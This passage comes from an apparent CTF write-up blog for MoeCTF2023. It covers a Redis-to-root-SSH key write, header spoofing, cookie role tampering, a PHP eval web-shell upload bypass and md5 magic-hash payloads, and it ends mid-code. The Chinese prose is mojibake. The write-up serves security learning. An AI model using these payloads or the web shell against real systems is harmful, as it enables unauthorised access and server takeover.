operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>config_set<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">,</span> <span class="token string">'/root/.ssh'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>config_set<span class="token punctuation">(</span><span class="token string">'dbfilename'</span><span class="token punctuation">,</span> <span class="token string">'authorized_keys'</span><span class="token punctuation">)</span><span class="token boolean">True</span><span class="token operator">>></span><span class="token operator">></span> r<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token boolean">True</span></code></pre><p>å‚è€ƒ <a href="https://www.cnblogs.com/wongbingming/articles/12384764.html">https://www.cnblogs.com/wongbingming/articles/12384764.html</a> ï¼Œå®‰è£…paramikoè¿›è¡Œsshè¿æ¥</p><pre class="language-python" data-language="python"><code class="language-python">subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">"pip3 install paramiko"</span><span class="token punctuation">,</span>stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">import</span> paramiko<span class="token operator">>></span><span class="token operator">></span> pkey <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>RSAKey<span class="token punctuation">.</span>from_private_key_file<span class="token punctuation">(</span><span class="token string">'privkey'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> trans <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>Transport<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'172.20.0.3'</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> trans<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>username<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span> pkey<span class="token operator">=</span>pkey<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> ssh <span class="token operator">=</span> paramiko<span class="token punctuation">.</span>SSHClient<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> ssh<span class="token punctuation">.</span>_transport <span class="token operator">=</span> trans<span class="token operator">>></span><span class="token operator">></span> stdin<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> stdin<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr <span class="token operator">=</span> ssh<span class="token punctuation">.</span>exec_command<span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><blockquote><p>moectf{Information-leakage-Is-dangerous!-Are-YOu-myS0L-MasT3r?-P@sSW0Rd-F0r-redis-Is-NeceSsary}</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MoeCTF2023-web</title>
      <link href="/2024/07/14/MoeCTF2023-web/"/>
      <url>/2024/07/14/MoeCTF2023-web/</url>
      
        <content type="html"><![CDATA[<h4 id="http"><a href="#http" class="headerlink" title="http"></a>http</h4><pre class="language-php" data-language="php"><code class="language-php">this is <span class="token constant">GET</span> method<span class="token punctuation">,</span>         your mission<span class="token punctuation">:</span>        <span class="token number">1.</span><span class="token keyword">use</span> <span class="token package">parameter</span><span class="token punctuation">:</span> UwU<span class="token operator">=</span>u        <span class="token number">2.</span>post <span class="token operator">**</span>form<span class="token operator">**</span><span class="token punctuation">:</span> Luv<span class="token operator">=</span>u        <span class="token number">3.</span><span class="token keyword">use</span> <span class="token package">admin</span> character        <span class="token number">4.</span>request from <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span>        <span class="token number">5.</span><span class="token keyword">use</span> <span class="token package">browser</span> <span class="token string single-quoted-string">'MoeBrowser'</span>        Complete All Missions</code></pre><p>è€ƒå¯ŸåŸºç¡€çš„httpåè®®</p><p><img src="/MoeCTF2023-web%5Chttp.png" loading="lazy"></p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">example.com</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">NewStarCTF2023</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">28</span></span><span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://example.com</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">newstarctf.com</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">power=ctfer</span></span><span class="token header"><span class="token header-name keyword">X-Real-Ip</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">Client-Ip</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>secret=n3wst4rCTF2023g00000dä¼ªé€ IP<span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">Client-ip</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Client-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Remote-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Rriginating-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Remote-addr</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">HTTP_CLIENT_IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Real-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">X-Originating-IP</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1</span></span><span class="token header"><span class="token header-name keyword">via</span><span class="token punctuation">:</span><span class="token header-value">127.0.0.1  ä»£ç†</span></span></code></pre><h4 id="webå…¥é—¨æŒ‡åŒ—"><a href="#webå…¥é—¨æŒ‡åŒ—" class="headerlink" title="webå…¥é—¨æŒ‡åŒ—"></a>webå…¥é—¨æŒ‡åŒ—</h4><p>æ–‡æœ«æœ‰ä¸€ä¸²å¯†æ–‡</p><p>666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c5131524758316379596c396a61474673624756755a3055684958303d</p><p>è¿™æ˜¯ä¸€ä¸²16è¿›åˆ¶ç¼–ç ï¼Œè§£ç å¾—åˆ°</p><p>bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0&#x3D;</p><p>flagçš„å†…å®¹è§£ç å¾—åˆ°</p><p>moectf{w3lCome_To_moeCTF_W2b_challengE!!}</p><h4 id="å½¼å²¸çš„flag"><a href="#å½¼å²¸çš„flag" class="headerlink" title="å½¼å²¸çš„flag"></a>å½¼å²¸çš„flag</h4><p>F12æºç ä¸­è¢«æ’¤å›çš„æ¶ˆæ¯é‚£é‡Œæœ‰flag</p><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><p>é™„ä»¶ä¸­æœ‰ä¸€äº›apiè¯´æ˜</p><p>æ³¨å†Œ <code>POST /register</code></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"koito"</span><span class="token punctuation">,</span>    <span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"123456"</span><span class="token punctuation">&#125;</span></code></pre><p>ç™»å½• <code>POST /login</code></p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"koito"</span><span class="token punctuation">,</span>    <span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"123456"</span><span class="token punctuation">&#125;</span></code></pre><p>è·å–flag <code>GET /flag</code></p><p>æŸ¥è¯¢æœåŠ¡çŠ¶æ€ &#96;GET &#x2F;status</p><p>æŒ‰ç…§æµç¨‹æ³¨å†Œå¹¶ç™»é™†åï¼Œè¿”å›äº†Cookie</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">token=eyJ1c2VybmFtZSI6ICJoc2FkIiwgInBhc3N3b3JkIjogIjEyMzQ1NiIsICJyb2xlIjogInVzZXIifQ==;</span></span>base64decodeï¼š&#123;"username": "hsad", "password": "123456", "role": "user"&#125;</code></pre><p>å°†<code>role</code>æ”¹ä¸ºadminå¹¶ä½œä¸ºCookieè®¿é—®&#x2F;flagå¾—åˆ°flag</p><h4 id="gas-gas-gas-Spider"><a href="#gas-gas-gas-Spider" class="headerlink" title="gas!gas!gas!(Spider)"></a>gas!gas!gas!(Spider)</h4><p>å¦‚ä½•æ¼‚ç§»</p><ol><li>æ²¹é—¨å¤§è½®èƒè½¬é€Ÿé«˜ç©ºè½¬ï¼ŒæŠ“åœ°åŠ›å°±å°ï¼Œåä¹‹æŠ“åœ°åŠ›å¤§</li><li>ä¿æŒåæ‰“ï¼Œæ ¹æ®å¼¯æ–¹å‘æç¤ºï¼Œåæ‰“åå‘</li><li>åœ¨0.5så†…å¿«é€Ÿååº”ï¼Œå¹¶åšæŒä¸‹æ¥äº”è½®</li><li>é‡æ–°éšä¾¿æäº¤ä¸€æ¬¡æ“ä½œæ¥é‡æ–°å¼€å§‹</li></ol><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;form action&#x3D;&quot;&#x2F;&quot; method&#x3D;&quot;POST&quot;&gt;   &lt;label for&#x3D;&quot;driver&quot;&gt;é€‰æ‰‹:&lt;&#x2F;label&gt;   &lt;input type&#x3D;&quot;text&quot; id&#x3D;&quot;driver&quot; name&#x3D;&quot;driver&quot; required&gt;&lt;br&gt;&lt;br&gt;      &lt;label for&#x3D;&quot;steering_control&quot;&gt;æ–¹å‘æ§åˆ¶:&lt;&#x2F;label&gt;   &lt;select id&#x3D;&quot;steering_control&quot; name&#x3D;&quot;steering_control&quot; required&gt;     &lt;option value&#x3D;&quot;-1&quot;&gt;å·¦&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;0&quot; selected&gt;ç›´è¡Œ&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;1&quot;&gt;å³&lt;&#x2F;option&gt;   &lt;&#x2F;select&gt;&lt;br&gt;&lt;br&gt;   &lt;label for&#x3D;&quot;throttle&quot;&gt;æ²¹é—¨æ§åˆ¶:&lt;&#x2F;label&gt;   &lt;select id&#x3D;&quot;throttle&quot; name&#x3D;&quot;throttle&quot; required&gt;     &lt;option value&#x3D;&quot;0&quot;&gt;æ¾å¼€&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;1&quot;&gt;ä¿æŒ&lt;&#x2F;option&gt;     &lt;option value&#x3D;&quot;2&quot; selected&gt;å…¨å¼€&lt;&#x2F;option&gt;   &lt;&#x2F;select&gt;&lt;br&gt;&lt;br&gt;      &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;æäº¤&quot;&gt; &lt;&#x2F;form&gt;</code></pre><p>æ ¹æ®è¿”å›çš„æç¤ºæ¥æ”¹å˜æ¯æ¬¡èµ›è½¦çš„æ“ä½œï¼Œä¸è¿‡æœ‰æ—¶é—´é™åˆ¶ï¼Œæ‰€ä»¥è¦ç¼–å†™è„šæœ¬å®Œæˆ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> reurl <span class="token operator">=</span> <span class="token string">'http://localhost:3906/'</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">&#125;</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>post_data <span class="token operator">=</span> <span class="token string">"driver=hsad&amp;steering_control=0&amp;throttle=0&#125;"</span>post <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>    url<span class="token operator">=</span>url<span class="token punctuation">,</span>    data<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>post_data<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>    headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'&lt;h3>&lt;font color="red">(.*)&lt;/font>&lt;/h3>&lt;/div>'</span><span class="token punctuation">,</span> post<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>steering_control <span class="token operator">=</span> <span class="token number">0</span>throttle <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'å¼¯é“å‘å·¦'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        steering_control <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">if</span> <span class="token string">'å¼¯é“å‘å³'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        steering_control <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">if</span> <span class="token string">'å¼¯é“ç›´è¡Œ'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        steering_control <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">if</span> <span class="token string">'ä¿æŒè¿™ä¸ªé€Ÿåº¦'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        throttle <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">if</span> <span class="token string">'æŠ“åœ°åŠ›å¤ªå¤§äº†'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        throttle <span class="token operator">=</span> <span class="token number">2</span>    <span class="token keyword">if</span> <span class="token string">'æŠ“åœ°åŠ›å¤ªå°äº†'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        throttle <span class="token operator">=</span> <span class="token number">0</span>    steering_control_dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'-1'</span><span class="token punctuation">:</span> <span class="token string">'å·¦'</span><span class="token punctuation">,</span>        <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'ç›´è¡Œ'</span><span class="token punctuation">,</span>        <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">'å³'</span>    <span class="token punctuation">&#125;</span>    throttle_dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'0'</span><span class="token punctuation">:</span> <span class="token string">'æ¾å¼€'</span><span class="token punctuation">,</span>        <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">'ä¿æŒ'</span><span class="token punctuation">,</span>        <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token string">'å…¨å¼€'</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>steering_control_dic<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>steering_control<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>throttle_dic<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>throttle<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    post <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>        url<span class="token operator">=</span>url<span class="token punctuation">,</span>        data<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'driver=hsad&amp;steering_control=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>steering_control<span class="token punctuation">&#125;</span></span><span class="token string">&amp;throttle=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>throttle<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span>        headers<span class="token operator">=</span>headers    <span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'moectf'</span> <span class="token keyword">in</span> post<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'moectf(.*)'</span><span class="token punctuation">,</span> post<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">-6]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'&lt;h3>&lt;font color="red">(.*)&lt;/font>&lt;/h3>'</span><span class="token punctuation">,</span> post<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    </code></pre><h4 id="moeå›¾åºŠ-æ–‡ä»¶ä¸Šä¼ "><a href="#moeå›¾åºŠ-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="moeå›¾åºŠ(æ–‡ä»¶ä¸Šä¼ )"></a>moeå›¾åºŠ(æ–‡ä»¶ä¸Šä¼ )</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">const</span> allowedExtensions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'png'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>           <span class="token keyword">const</span> <span class="token constant">fileExtension</span> <span class="token operator">=</span> file<span class="token operator">.</span>name<span class="token operator">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>allowedExtensions<span class="token operator">.</span><span class="token function">includes</span><span class="token punctuation">(</span>fileExtension<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>               <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'åªå…è®¸ä¸Šä¼ åç¼€åä¸ºpngçš„æ–‡ä»¶ï¼'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">return</span><span class="token punctuation">;</span>           <span class="token punctuation">&#125;</span></code></pre><p>å®¡è®¡æºç æ—¶å‘ç°ï¼Œåªæ˜¯ç®€å•çš„ç”¨<code>.</code>ä½œä¸ºåˆ†éš”åˆ¤æ–­äº†ç¬¬ä¸€ä¸ªåç¼€åï¼Œäºæ˜¯ä¸Šä¼ </p><pre class="language-php" data-language="php"><code class="language-php">1.png.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'attack'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>GET: http://localhost:6472/uploads/1.png.phpPOST: attack=system('tac /flag');</code></pre><h4 id="å¤§æµ·æé’ˆ"><a href="#å¤§æµ·æé’ˆ" class="headerlink" title="å¤§æµ·æé’ˆ"></a>å¤§æµ·æé’ˆ</h4><p>æ‰“å¼€é¢˜ç›®å¯è§åªéœ€è¦bpè·‘ä¸€åˆ°ä¸€åƒçš„æ•°å­—å³å¯</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">use</span> <span class="token operator">/</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token operator">&lt;</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">1000</span><span class="token operator">></span> to connect to different parallel universes</code></pre><h4 id="meoå›¾åºŠ-æ–‡ä»¶åŒ…å«-md5"><a href="#meoå›¾åºŠ-æ–‡ä»¶åŒ…å«-md5" class="headerlink" title="meoå›¾åºŠ(æ–‡ä»¶åŒ…å« md5)"></a>meoå›¾åºŠ(æ–‡ä»¶åŒ…å« md5)</h4><p>è¿™æ¬¡å¢åŠ äº†æ–‡ä»¶å¤´æ£€æµ‹äºæ˜¯åŠ ä¸Š<code>GIF89a</code>äºæ˜¯ä¸Šä¼ æˆåŠŸï¼Œä¸è¿‡å‘ç°å¹¶ä¸æ˜¯ç›´æ¥ç»™å‡ºæ–‡ä»¶ç›®å½•ï¼Œè€Œæ˜¯é€šè¿‡å‚æ•°ä¼ é€’ï¼Œäºæ˜¯çŒœæµ‹æ–‡ä»¶åŒ…å«æ¼æ´</p><p><img src="meo%E5%9B%BE%E5%BA%8A.png" loading="lazy"></p><p>å¾—åˆ°æç¤ºè®¿é—®<code>Fl3g_n0t_Here_dont_peek!!!!!.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$param1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$param2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$param1</span> <span class="token operator">!==</span> <span class="token variable">$param2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$md5Param1</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$md5Param2</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5Param1</span> <span class="token operator">==</span> <span class="token variable">$md5Param2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.O!! "</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.o??"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"o.O?"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.o?"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>ç®€å•çš„md5ç»•è¿‡ï¼Œå¯ä»¥æ•°ç»„ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥md5 0eç»•è¿‡</p><pre class="language-php" data-language="php"><code class="language-php">Payloadï¼šparam1<span class="token operator">=</span><span class="token constant">QNKCDZO</span><span class="token operator">&amp;</span>param2<span class="token operator">=</span><span class="token number">240610708</span>    <span class="token constant">QLTHNDT</span> <span class="token operator">-></span> <span class="token property">0e405967825401955372549139051580</span>    <span class="token constant">QNKCDZO</span> <span class="token operator">-></span> <span class="token property">0e830400451993494058024219903391</span>     s878926199a <span class="token operator">-></span> <span class="token property">0e545993274517709034328855841020</span>param1<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">11</span><span class="token operator">&amp;</span>param2<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">22</span></code></pre><h4 id="å¤ºå‘½åä¸‰æª-ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸"><a href="#å¤ºå‘½åä¸‰æª-ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸" class="headerlink" title="å¤ºå‘½åä¸‰æª(ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸)"></a>å¤ºå‘½åä¸‰æª(ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Hanxin.exe.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$Chant</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chant'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chant'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'å¤ºå‘½åä¸‰æª'</span><span class="token punctuation">;</span><span class="token variable">$new_visitor</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token 